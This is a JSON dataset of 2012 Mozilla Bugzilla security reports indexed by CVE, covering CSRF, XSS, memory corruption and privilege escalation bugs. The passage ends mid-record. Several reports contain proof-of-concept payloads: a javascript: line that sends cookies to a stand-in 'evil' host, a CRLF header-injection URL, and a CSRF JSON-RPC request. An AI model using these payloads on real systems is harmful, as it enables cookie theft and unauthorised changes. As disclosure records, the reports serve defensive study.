{
  "year": 2012,
  "total": 185,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2012-0440": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=718319",
        "title": "[SECURITY] JSON-RPC permits to bypass token checks and can lead to CSRF (no victim's action required)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.16 (KHTML, like Gecko) Chrome/18.0.1003.1 Safari/535.16 Steps to reproduce: Hello, No security token is used when a POST request is made in jsonrpc.cgi thus allowing an attacker to add as CC, to visit and bugs taken private, or restricted to certain users. To explore this it is necessary that a User with privileges to edit bugs, so the attacker creating a page specially crafted to add CC. Reproduce: Do a POST Request in https://bugzilla.mozilla.org/jsonrpc.cgi, whit this content: {\"version\":\"1.1\",\"method\":\"Bug.update\",\"id\":2,\"params\":{\"ids\":[629221],\"cc\":{\"add\":[\"youremail@hack.com\"]}}} Cheers, Mario"
      }
    ],
    "CVE-2012-0441": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=715073",
        "title": "Insufficient length checking in QuickDER decoder",
        "description": "I'm afraid I have to begin the new year with not so nice news - the \"QuickDER\" ASN.1 decoder in NSS has a flaw with rather serious consequences: while it rejects bogus (oversized) lengths when trying to match a buffer against a given template, it fails to properly detect a number of zero-length items which are illegal as per X.690. This can cause all sorts of troubles: one of them is reported in bug 697420 (which happened to be the starting point for my discovery, actually). Depending on what exactly NSS - or the application - does after having called SEC_QuickDERDecodeItem, nasty bugs will occur, such as: 1) CERT_DecodeOCSPResponse() will mistakenly assume that it has successfully parsed a response, even if that response includes a zero-length ENUMERATED value. It will return the response to the caller, and when code subsequently - and rightfully - tries to clean up said response, CERT_DestroyOCSPResponse() will crash... because it's getting a bogus pointer from ocsp_GetResponseSignature(response), which it tries to dereference. 2) CERT_DecodeBasicConstraintValue is another case where illegal zero-length items lead to a serious problem: if a certificate includes a basicConstraints extension where the \"CA\" BOOLEAN is encoded with zero length, NSS mistakenly treats such a cert as a CA certificate (not as bad as Moxie's findings from 2002 about MS CAPI and basicConstraints, but still, quite worrying). I stopped looking for further issues at that point, but it would be quite surprising if these were the only ones. From my reading of X.690, of the 25 ASN.1 UNIVERSAL types currently recognized/defined in secasn1t.h, the following 7 can never have zero length (when properly DER encoded): BOOLEAN, INTEGER, BIT STRING, OBJECT_IDENTIFIER, ENUMERATED, UTCTime, GeneralizedTime. QuickDER should abort further processing when the template specifies one of these types and the buffer being processed holds such an illegal encoding. It's probably debatable what level of content checking should go into QuickDER (and what checks are better done in code which actually parses the values, such as DER_GetInteger), but some minimal zero-length sanity checks seem justified in QuickDER. The attached patch is a possible approach; note that due to re-indentation, the changes might appear larger at first sight than they effectively are. A demo \"exploit\" for the two issues mentioned above can be seen by visiting https://orod.velox.ch. First, the CA cert attached to this bug needs to be installed and trusted for SSL. A default setup of Firefox will then crash immediately in CERT_DestroyOCSPResponse() when opening the above URL. Note that the \"CA cert\" isn't really a certificate with \"CA\" set to TRUE, but NSS considers it a valid CA cert. As ASN.1 is at the heart of many parts of NSS (there are dozens of SEC_QuickDERDecodeItem calls in lib/, X.509/PKIX processing heavily depends on it), the potential impact of this issue should not be underestimated. Applications - and NSS itself - must be able to rely on SEC_QuickDERDecodeItem() rejecting invalid ASN.1 data, when asked to match this input against a given template. Note that the \"classic\" DER decoder, i.e. SEC_ASN1DecodeItem, has checks for illegal zero-length items, and will e.g. reject an OCSP response where the response status isn't encoded properly. Finally, let me point out that the patch also includes a second, belt-and-suspenders type fix: when returning a \"dest\" item with zero length (for those ASN.1 types where this is acceptable as per X.690, such as strings), QuickDER should not fill bogus pointers into dest->data - if code dealing with a SECItem afterwards only checks for a non-NULL data pointer without looking at the SECItem's length at the same time, even more subtle bugs may surface (the CERT_DecodeBasicConstraintValue actually being an example of this). I did not yet request a CVE ID number for this issue - let me know if I should do this, or if Mozilla can get an assignment."
      }
    ],
    "CVE-2012-0444": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=719612",
        "title": "Mozilla Firefox Ogg Vorbis Decoding Memory Corruption (ZDI-CAN-1477)",
        "description": "ZDI-CAN-1477: Mozilla Firefox Ogg Vorbis Decoding Memory Corruption Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Memory corruption is possible when Firefox is parsing Ogg Vorbis files. The vulnerability is inside the function static vorbis_info_floor *floor1_unpack (vorbis_info *vi,oggpack_buffer *opb), in the file libvorbis/lib/vorbis_floor1.c: --- code snip begin --- ... for(j=0,k=0;j<info->partitions;j++){ count+=info->class_dim[info->partitionclass[j]]; for(;k<count;k++){ int t=info->postlist[k+2]=oggpack_read(opb,rangebits); if(t<0 || t>=(1<<rangebits)) goto err_out; } } ... --- code snip end --- The loop populates the info->postlist array and can be overflowed. The values which determine the amount to copy are user influenced. The info->class_dim array is populated with user data, with each element value being between 1 and 8. The info->partitions value is also taken from userdata, and can be between 0 and 31. Thus, the total sub-loop iterations can be 8*31, or 248. Each iteration of the subloop copies one element (int) into info->postlist, a fixed-size buffer which is only sized to 65 elements (int). This results in memory corruption and can be exploited to gain remote code execution. -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht --- Confirmed crash in trunk from last night with POC at https://crash-stats.mozilla.com/report/index/bp-3f868463-5f01-4da8-966f-b8a642120119. Firefox 9.0.1 crash at https://crash-stats.mozilla.com/report/index/bp-43276710-2344-4ffb-a68c-041232120119. Password on POC zip is ZDI-CAN-1477."
      }
    ],
    "CVE-2012-0445": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=701071",
        "title": "<iframe> element is exposed across domains by its name attribute",
        "description": "Alex Dvorov reported this to security@m.o: A form can be submitted to a named iframe in another domain if you know the name attribute of the iframe element. This is a regression, as Firefox 3.6 creates a new top-level window to which the form is submitted if the named iframe doesn't exist within the current window. This is the same behavior as the current version of Chrome. I'm setting this as moderate severity, because most high bugs involve stealing information or running script in the context of another site, but this is still bad. You could easily use this to spoof the content in another site if you know the name of an iframe there. I could be persuaded that this is in fact a high bug."
      }
    ],
    "CVE-2012-0446": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=705651",
        "title": "Frame scripts that access untrusted objects are exploitable",
        "description": "Frame scripts run on the special JS context for which we call SetSecurityManagerForJSContext with flags=0, thus if a frame script calls into an untrusted function, XPConnect does not do proper security checks."
      }
    ],
    "CVE-2012-0447": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=710079",
        "title": "When using imgITools.encodeImage to encode image/vnd.microsoft.icon as png, output is always the same size and contains uninitialized bytes",
        "description": "I've been using the attached javascript to encode various images as image/vnd.microsoft.icon and write them to (.ico) files. I've noticed a couple things: 1) The output is always the exact same number of bytes (8214) 2) After the end of the valid data, the rest of the file is full of 0xcd bytes in debug builds and (apparently) uninitialized data in release builds - I think this data is uninitialized because converting the same image multiple times gives different results"
      }
    ],
    "CVE-2012-0448": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=714472",
        "title": "[SECURITY] utf8 homoglyphs are allowed in email addresses, which could allow an attacker to be CC'ed to private bugs by accident",
        "description": "Bugzilla allows utf8 in email addresses, including characters in the Cryllic alphabet that look identical to standard ascii letters. For example, admin@mozilla.org and Ð°dmin@mozilla.org are two distinct email addresses (the latter has a Cryllic a). Given that email addresses are used as usernames, this poses an impersonation risk. It could also be used by an attacker to maintain access to a victim's account, since their email address wouldn't appear to have changed. Such attacks are severely limited by bugzilla's email validation process. I have been unable to figure out where emails sent by the current version of BMO to addresses containing utf8 actually end up. Bugzilla 4.2rc1+ sends emails to addresses with utf8 preceding the @ fine (eg bÐ°d@sunday.slyip.net), but again utf8 in the domain name (eg good@fridÐ°y.slyip.net) causes the emails to go missing. Allowing utf8 in the domain name would be much worse, since anyone could register gmÐ°il.com or mozillÐ°.org I'm not yet certain that I have fully explored the threats posed by this."
      }
    ],
    "CVE-2012-0449": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=701806",
        "title": "Crash [@0x0 | txStylesheetCompiler::flushCharacters]",
        "description": "Opening the attached SVG causes a crash with null IP. The SVG uses XSL transforms. I'm reporting this as a potential security issue even though the crash is a null, because some common ways to get a null IP (e.g. stack buffer overflow) are more likely exploitable than run-of-the-mill null reads. Crash traces (from 64-bit Debian 6.0.3): 8.0 - https://crash-stats.mozilla.com/report/index/bp-c39ae37b-3dfe-4cf0-8f66-257cc2111111 9.0 beta - https://crash-stats.mozilla.com/report/index/bp-ff091148-d992-4daa-a7d5-985e42111111"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=702466",
        "title": "Crash with EIP=0x00000000 when parsing SVG+XSLT",
        "description": "When opening a specific SVG file (created by a mutation fuzzer), the browser will crash with EIP=0x00000000. This was tested on Firefox 3.6.24 / Ubuntu 10.04 LTS and Firefox 8.0 / WinXP SP3. Under Linux : a call to *(%eax) at _ZN20txStylesheetCompiler15flushCharactersEv+26 will set EIP to 0x000000. An annotated gdb session is attached. A similar behavior is constated on Firefox 8.0 (a screenshot of windbg !exploitable is attached too)."
      }
    ],
    "CVE-2012-0450": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=716868",
        "description": "When opening a specific SVG file (created by a mutation fuzzer), the browser will crash with EIP=0x00000000. This was tested on Firefox 3.6.24 / Ubuntu 10.04 LTS and Firefox 8.0 / WinXP SP3. Under Linux : a call to *(%eax) at _ZN20txStylesheetCompiler15flushCharactersEv+26 will set EIP to 0x000000. An annotated gdb session is attached. A similar behavior is constated on Firefox 8.0 (a screenshot of windbg !exploitable is attached too)."
      }
    ],
    "CVE-2012-0451": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=717511",
        "title": "Bad intersection of injected HTTP headers leads to Content Security Policy (CSP) Bypass",
        "description": "User Agent: Mozilla/5.0 (Ubuntu; X11; Linux x86_64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Build ID: 20111228084940 Steps to reproduce: When multiple X-Content-Security-Policy are present they have an additive effect on the policy for that page. This allows an attacker to introduce a new rule using CRLF injection and obtain XSS. In the following PoC we are introducing the rule set \"allow *\" and an HTTP body where we are including alert.js from another domain. This poc will not work on your machine because http://sitewatch/alert.js is not accessible to you, this value will have to be changed. http://localhsot/crlf.py?url=1%0Ax-content-security-policy:%20allow%20*%0Acontent-length:%2049%0A%0A%3Cscript%20src=%27http://sitewatch/alert.js%27%3E%3C/script%3E Here is a vulnerable web application where alert(1) does not execute do to the CSP. from mod_python import apache, util def handler(req): input=util.FieldStorage(req, keep_blank_values=1) req.headers_out.add('X-Content-Security-Policy', \"default-src 'self'\") req.headers_out.add('some-header', input.getfirst(\"url\")) req.content_type = \"text/html\" req.write(\"<script>alert(1)</script>\") return apache.OK Here is a generic apache config to run the mod_python file above: <Directory /var/www/> AddHandler python-program .py PythonHandler crlf PythonDebug On Options Indexes FollowSymLinks MultiViews AllowOverride All Order allow,deny allow from all </Directory>"
      }
    ],
    "CVE-2012-0452": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=724284",
        "title": "use after free in nsXBLDocumentInfo::ReadPrototypeBindings",
        "description": "Olli found this. Could be causing bug 724129. nsXBLDocumentInfo::ReadPrototypeBindings: 653 nsXBLPrototypeBinding* binding = new nsXBLPrototypeBinding(); 654 rv = binding->Read(stream, docInfo, doc, flags); 655 if (NS_FAILED(rv)) { 656 delete binding; 657 return rv; 658 } nsXBLPrototypeBinding::Read: 1554 rv = aDocInfo->SetPrototypeBinding(id, this); 1555 NS_ENSURE_SUCCESS(rv, rv); 1556 1557 nsCAutoString className; 1558 rv = aStream->ReadCString(className); 1559 NS_ENSURE_SUCCESS(rv, rv); [... many other ways to fail without removing the binding ...] ReadPrototypeBindings creates the binding, calls into Read, Read stores the binding in the hash table. If the Read fails, then the binding is deleted. But on any code path except one, the binding is kept in the table. The cycle collector reads this table, grabs the bogus binding and attempts to do a virtual method call on it. If bug 724129 is any indication, at least 90% of the time, this results in the browser attempting to execute at precisely the address 0x4246c83. Maybe jemalloc ends up reusing the location for the binding immediately for something that points there. That probably reduces how exploitable this is, but not all of these crashes look like that. Read is only called in this one place. I manually inspected the other calls to SetPrototypeBinding and they didn't seem to have this problem, but I'm not very familiar with this code."
      }
    ],
    "CVE-2012-0453": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=725663",
        "title": "[SECURITY] CSRF vulnerability in the XML-RPC API when using mod_perl",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.7 Safari/535.19 Steps to reproduce: Hello, There is a CSRF vulnerability in Bugzilla XML-RPC. The vulnerability allows an attacker to make alterations to a bug, groups, etc.. The vulnerability is due to non-implementation of security tokens, thus allowing you to make HTTP requests, bugs and making alterations in groups. Reproduce: 1. Log in https://landfill.bugzilla.org/bugzilla-tip. 2. Open PoC.html 3. See the XML response. 4. Back to https://landfill.bugzilla.org/bugzilla-tip 4. See you logouted. Note: My PoC only make the user logged be logout. Cheers, Mario."
      }
    ],
    "CVE-2012-0454": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=684555",
        "title": "Exploitable \"use after free\" @ SHLWAPI!IUnknown_QueryService 0x3b",
        "description": "Under windows 7 32-bit, a crash can be caused with the attached code. The simplest POC code includes a parent and one child window. The parent window spawns the child and after a short delay invokes a 'file open' dialog from the child. Then the parent closes the child window. This causes an exploitable crash. Pre-requisites: * JavaScript enabled * Ability to create at least one pop-up window (not a tab) [browser.link.open_newwindow -> 2] [or a popup blocker bypass] * Firefox 5, 6 or Nightly [other versions not tested] In the basic POC, the faulting instruction is a CALL to freed memory: SHLWAPI!IUnknown_QueryService+0x3b: 76d842a1 ff11 call dword ptr [ecx] ds:0023:feeefeee=???????? Note that 0xfeeefeee is what is placed into Windows memory which has been HeapFree'd. We are also attaching an exploit POC; this uses two child windows. Due to certain allocation sequences, it turns out that 0x10693AEA ends up being in ECX about 30% of the time. Believe it or not, this address comes from the binary representation of the GUID for \"my computer\" {20d04fe0-3aea-1069-a2d8-08002b30309d} which ends up in the memory where ECX gets loaded. So a stable pointer value turns up in ECX quite often. On 32-bit Windows 7, a heap spray can arrange for page-aligned data to turn up at 0x10693AEA. With more work on heap feng shui (i.e, using javascript to control memory allocations) it may be possible to get 0x10693AEA into ECX more reliably or in fact directly control the value which goes into ECX. The exploit POC should show 0x0c0c0c0c at the top of the call stack. We have got code execution on Windows 7 with DEP turned off; it is also possible to get this to work on stock Windows 7 using a heap-based ROP. We were only able to reproduce this issue on Windows 7 32-bit (XP and Win7 64 did not crash). Non-windows operating systems should not be vulnerable."
      }
    ],
    "CVE-2012-0455": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=704354",
        "title": "\"DragAndDropJacking\" (?) + javAscript: URL = XSS",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0 Build ID: 20111104165243 Steps to reproduce: It is possible to do Cross Domain Self XSS by using the: 1- HTML5 Drag and Drop feature that can lead to bypassing the cross domain policy. 2- Bypassing \"javascript:\" protocol protection by changing the characters' cases. i.e. dragging and dropping \"javascript:alert(1)\" to a new tab does not work. However, dragging and dropping \"jAvAscript:alert(1)\" works successfully. Now, if you can embed your malicious IFrame in another website such as Facebook, you can conduct a Cross Site Scripting against that website. I have created a test case for you that the victim \"soroush.secproject.com\" can be exploited by \"www.0me.me\": http://soroush.secproject.com/downloadable/demo/FF8.0.SelfXSSHost.html I will attach both of \"FF8.0.SelfXSSHost.html\" and \"FF8.0.SelfXSSTarget.html\" to this issue as well. I tried to create a real example to show how dangerous it can be. All the Javascripts are harmless and will only show you document.location+document.cookie. Actual results: It is possible to drag and drop a javascript (for example \"JaVaScripT:alert(1)\") to a HTML page that use HTML5 drag and drop feature to conduct XSS attack. Now, if you put this HTML5 page in an Iframe, the malicious script can be run on the domain that include the Iframe. Expected results: First of all, \"javascript:\" protocol should be validated properly to not be run by upper-casing the characters as an example. The script that is being dragged and dropped, should be run under the same domain (not any other domain)."
      }
    ],
    "CVE-2012-0456": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=711653",
        "title": "SVGFilter out of bounds read (Address Sanitizer)",
        "description": "User Agent: Mozilla/5.0 (Ubuntu; X11; Linux x86_64; rv:10.0a2) Gecko/20111214 Firefox/10.0a2 Build ID: 20111214081512 Steps to reproduce: OS: Ubuntu 11.04 x64 Version: Nightly - 11.0a1 (2011-12-17) Open one of the attached svg-files trough html with the following content example: <img src=\"reduce_heap_firefox.svg\" width=50 height=50> Actual results: With the reduced case Address Sanitizer reports: ==7843== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f52ae049193 at pc 0x7f52d0e832e3 bp 0x7fff11229800 sp 0x7fff112297f8 READ of size 1 at 0x7f52ae049193 thread T0 #0 0x7f52d0e832e3 (/home/attekett/src/objdir-ff-asan/toolkit/library/libxul.so+0x1d392e3) 0x7f52ae049193 is located 3 bytes to the right of 16-byte region [0x7f52ae049180,0x7f52ae049190) allocated by thread T0 here: #0 0x40b0de (/home/attekett/src/objdir-ff-asan/dist/bin/firefox-bin+0x40b0de) #1 0x7f52d1a970ac (/home/attekett/src/objdir-ff-asan/toolkit/library/libxul.so+0x294d0ac) #2 0x7f52d1a96d01 (/home/attekett/src/objdir-ff-asan/toolkit/library/libxul.so+0x294cd01) ==7843== ABORTING Stats: 48M malloced (74M for red zones) by 230316 calls Stats: 3M realloced by 15011 calls Stats: 26M freed by 123878 calls Stats: 0M really freed by 0 calls Stats: 152M (38929 full pages) mmaped in 38 calls mmaps by size class: 8:212979; 9:24573; 10:8190; 11:6141; 12:2048; 13:1024; 14:512; 15:256; 16:192; 17:32; 18:48; 19:8; 20:4; mallocs by size class: 8:193922; 9:20891; 10:7322; 11:5292; 12:1426; 13:631; 14:497; 15:133; 16:131; 17:20; 18:45; 19:5; 20:1; frees by size class: 8:101631; 9:12645; 10:4978; 11:2738; 12:874; 13:472; 14:346; 15:102; 16:66; 17:15; 18:8; 19:3; rfrees by size class: Stats: malloc large: 71 small slow: 893 Shadow byte and word: 0x1fea55c09232: fb 0x1fea55c09230: 00 00 fb fb fb fb fb fb More shadow bytes: 0x1fea55c09210: 00 00 00 00 00 00 00 00 0x1fea55c09218: 00 fb fb fb fb fb fb fb 0x1fea55c09220: fa fa fa fa fa fa fa fa 0x1fea55c09228: fa fa fa fa fa fa fa fa =>0x1fea55c09230: 00 00 fb fb fb fb fb fb 0x1fea55c09238: fb fb fb fb fb fb fb fb 0x1fea55c09240: fa fa fa fa fa fa fa fa 0x1fea55c09248: fa fa fa fa fa fa fa fa 0x1fea55c09250: 00 fb fb fb fb fb fb fb"
      }
    ],
    "CVE-2012-0457": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=720103",
        "title": "ASAN: heap-use-after-free READ of size 8 at nsSMILTimeValueSpec::ConvertBetweenTimeContainers",
        "description": "Repro-file as attachment. ==21012== ERROR: AddressSanitizer heap-use-after-free on address 0x7fa967597e88 at pc 0x7fa98a245854 bp 0x7fffc4ef2160 sp 0x7fffc4ef2158 READ of size 8 at 0x7fa967597e88 thread T0 #0 0x7fa98a245854 (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1df2854) #1 0x7fa98a256c18 (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1e03c18) 0x7fa967597e88 is located 8 bytes inside of 32-byte region [0x7fa967597e80,0x7fa967597ea0) freed by thread T0 here: #0 0x40ad84 (/home/ouspg/firefox/objdir-ff-asan/dist/bin/firefox+0x40ad84) #1 0x7fa98a2548d5 (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1e018d5) #2 0x7fa98a24f4c6 (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1dfc4c6) #3 0x7fa98a24ef4e (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1dfbf4e) #4 0x7fa98a259776 (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1e06776) #5 0x7fa98a256c18 (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1e03c18) previously allocated by thread T0 here: #0 0x40ae64 (/home/ouspg/firefox/objdir-ff-asan/dist/bin/firefox+0x40ae64) #1 0x7fa98e37613d (/home/ouspg/firefox/objdir-ff-asan/memory/mozalloc/libmozalloc.so+0x113d) #2 0x7fa98a24f8cd (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1dfc8cd) #3 0x7fa98a24473f (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1df173f) #4 0x7fa98a244e05 (/home/ouspg/firefox/objdir-ff-asan/toolkit/library/libxul.so+0x1df1e05) ==21012== ABORTING Stats: 54M malloced (77M for red zones) by 226646 calls Stats: 3M realloced by 10807 calls Stats: 29M freed by 100041 calls Stats: 0M really freed by 0 calls Stats: 160M (40979 full pages) mmaped in 40 calls mmaps by size class: 8:196596; 9:32764; 10:8190; 11:6141; 12:2048; 13:1024; 14:512; 15:256; 16:256; 17:32; 18:64; 19:8; 20:4; mallocs by size class: 8:187646; 9:23438; 10:7261; 11:5113; 12:1486; 13:776; 14:463; 15:169; 16:213; 17:23; 18:51; 19:5; 20:2; frees by size class: 8:78129; 9:12741; 10:4539; 11:2633; 12:830; 13:600; 14:244; 15:132; 16:163; 17:17; 18:10; 19:2; 20:1; rfrees by size class: Stats: malloc large: 81 small slow: 942 Shadow byte and word: 0x1ff52ceb2fd1: fd 0x1ff52ceb2fd0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff52ceb2fb0: 00 00 00 00 00 00 fb fb 0x1ff52ceb2fb8: fb fb fb fb fb fb fb fb 0x1ff52ceb2fc0: fa fa fa fa fa fa fa fa 0x1ff52ceb2fc8: fa fa fa fa fa fa fa fa =>0x1ff52ceb2fd0: fd fd fd fd fd fd fd fd 0x1ff52ceb2fd8: fd fd fd fd fd fd fd fd 0x1ff52ceb2fe0: fa fa fa fa fa fa fa fa 0x1ff52ceb2fe8: fa fa fa fa fa fa fa fa 0x1ff52ceb2ff0: fd fd fd fd fd fd fd fd GDB: (gdb) i r rax 0x0 0 rbx 0x7fffd8221180 140736819499392 rcx 0x7fffffff9a50 140737488329296 rdx 0x7fffd84a4dc0 140736822136256 rsi 0x8 8 rdi 0x7fffd8221180 140736819499392 rbp 0x8 0x8 rsp 0x7fffffff9940 0x7fffffff9940 r8 0x7ffff7ec6048 140737352851528 r9 0xc2b 3115 r10 0x7fffd8161bc0 140736818715584 r11 0x0 0 r12 0x7fffd84a4dc0 140736822136256 r13 0x0 0 r14 0x3 3 r15 0x7ffff4290b88 140737289718664 rip 0x7ffff42944b6 0x7ffff42944b6 <nsSMILTimeValueSpec::ConvertBetweenTimeContainers(nsSMILTimeValue const&, nsSMILTimeContainer const*)+14> eflags 0x10202 [ IF RF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0 (gdb) i s #0 nsSMILTimeValueSpec::ConvertBetweenTimeContainers (this=0x7fffd8221180, aSrcTime=..., aSrcContainer=0x7fffd84a4dc0) at /build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nsSMILTimeValueSpec.cpp:546 #1 0x00007ffff42946fa in nsSMILTimeValueSpec::HandleNewInterval (this=0x7fffd8221180, aInterval=..., aSrcContainer=0x7fffd84a4dc0) at /build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nsSMILTimeValueSpec.cpp:183 #2 0x00007ffff4290ba8 in nsSMILTimedElement::NotifyNewIntervalCallback (aKey=<value optimized out>, aData=<value optimized out>) at /build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nsSMILTimedElement.cpp:2315 #3 0x00007ffff45c415b in PL_DHashTableEnumerate (table=0x7fffd82119b0, etor=0x7ffff4290b88 <nsTHashtable<nsPtrHashKey<nsSMILTimeValueSpec> >::s_EnumStub(PLDHashTable*, PLDHashEntryHdr*, PRUint32, void*)>, arg=0x7fffffff9a50) at /build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/obj-x86_64-linux-gnu/xpcom/build/pldhash.cpp:754 #4 0x00007ffff4291c54 in nsTHashtable<nsPtrHashKey<nsSMILTimeValueSpec> >::EnumerateEntries (this=<value optimized out>, enumFunc=<value optimized out>, userArg=<value optimized out>) at ../../dist/include/nsTHashtable.h:241 #5 0x00007ffff4291c9e in nsSMILTimedElement::NotifyNewInterval (this=0x7fffd8211900) at /build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nsSMILTimedElement.cpp:2203 #6 0x00007ffff42926c5 in nsSMILTimedElement::UpdateCurrentInterval (this=0x7fffd8211900, aForceChangeNotice=<value optimized out>) at /build/buildd/firefox-trunk-12.0~a1~hg20120114r84451/build-tree/mozilla/content/smil/nsSMILTimedElement.cpp:1989 . . ."
      }
    ],
    "CVE-2012-0458": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=719994",
        "title": "loads of principal-inheriting URIs (e.g. javascript:) on chrome-privileged pages (e.g. about:sessionstore) allows unexpected privilege escalation",
        "description": "It is possible to trap user on a chrome privileged page with buttons leading to arbitrary code if a browser session is launched with a maliciously crafted homepage URI. There are 2 things which combined may effectively prevent users from realizing they deal with a malicious link when they set their homepage by dropping an image on the home button: 1. Using DataTransfer, text/x-moz-url of the drag can be manipulated on the fly. 2. Firefox displays a misleading prompt after dropping a link on the home button -- it says that \"this document\" is being set as the homepage, which is incorrect. Thus, the user has no way of knowing what URI will be set as homepage without inspecting the source. Unless they realize that both the status bar of the dragged image and the prompt message from the browser are misleading and go check the newly set home page in Options->General (instead of simply pressing the home button to see if it goes where expected), it can be leveraged by a malicious party in 2 ways: 1. Stealing cookies. The obvious and not very interesting scenario -- javascript:Image().src='http://evil/'+encodeURI(document.cookie);location.href='http://theactualwebsite' will silently steal cookies of every website the user navigates away from by pressing the home button. 2. Code execution. Here's a video demonstrating the concept: http://www.youtube.com/watch?v=xDmyWk58Xo4 (select fullscreen and 1080p for the optimal quality) - The malicious website detects the draginit event of the icon and verifies that the desired URI landed on the homepage by probing an iframed javascript:window.home(), then it sets the cookie to schedule a crash in the next browsing session. - When a new session is started, the website starts crashing the browser. - After 2 crashes, the user is presented with about:sessionrestore and 2 options. If they decide to restore the session, Firefox will crash again and the user will return to about:sessionrestore. Trying to remove the home page tab from the list will disable the restore button. If they click the other button -- \"start a new session\" -- the javascript link will inherit chrome privileges from about:sessionrestore and an arbitrary code will be executed. Pressing the home button will execute the payload as well. Seeing that this method of setting home page is fairly popular (several well known websites provide their drag icons) and it is a seemingly innocuous action, you may want to disallow setting URI_INHERITS_SECURITY_CONTEXT as a homepage -- unless you see a demand for using bookmarklets as homepages, it would be the easiest way to make this feature safe. Displaying the actual URI in the confirmation prompt would make it less prone to abuse, too."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=723808",
        "title": "disallow inheriting of system principal in type=content docshells",
        "description": "We've had a number of bugs over the years that were the result of somehow managing to load principal-inheriting URIs (data: and javascript:) on chrome-privileged pages loaded in the browser content area (e.g. about:config). Now that we have more and more chrome-privileged \"in-content\" pages, that's even more likely to be possible. As a precautionary measure, it makes sense to disallow these loads from inheriting the system principal - it seems quite unlikely that there are any valid use cases for this."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=718203",
        "title": "prevent self-XSS in homepage icon (disallow javascript: drops)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 Build ID: 20111220165912 Steps to reproduce: Tested on Firefox 9.01 Windows 7 SP1 Reproduce: 1. Change you homepage to \"javascript:alert(document.cookie)\" or also you can be \"javascript://www.google.com.br/?xss=%0aalert(1)\". 2. Go to http://www.google.com. 3. Click in homepage icon. 4. See yours cookies of \"http://www.google.com\". I think this can be exploited to steal cookies. Because extensions can change the homepage, and convence the victim to click in homepage."
      }
    ],
    "CVE-2012-0459": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=723446",
        "title": "Access to a keyframe's cssText after dynamic modification always crashes Gecko",
        "description": "The following test modifies a keyframe through JS and then reads its cssText twice. Gecko will always crash, sometimes at first read, sometimes at second: http://glazman.org/tmp/cssanim_bug.html Verified on OS X and Linux 32bits with 12.0a1. Related crash reports: bp-7624db3c-492f-42f1-9364-e2f132120202 bp-8eaecc4f-b4f1-4b5c-870c-b235b2120202 bp-9c64754f-0056-48eb-936f-0f4a62120202 bp-4237d936-28e5-4f62-8a00-f5d9c2120202 bp-9c32ddbf-211f-4d7d-9897-448002120202 This bug blocks the CSS Animations' editor I am currently working on for BlueGriffon."
      }
    ],
    "CVE-2012-0460": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=727303",
        "title": "window.fullScreen can be set by untrusted content but does not check for permission or show escape UI",
